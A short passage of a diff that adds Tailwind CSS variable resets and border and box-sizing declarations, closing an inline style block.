+  --tw-backdrop-opacity: ;
+  --tw-backdrop-saturate: ;
+  --tw-backdrop-sepia: ;
+  border-style: solid;
+  box-sizing: border-box;
+  --tw-bg-opacity: 1;
+}
+</style>
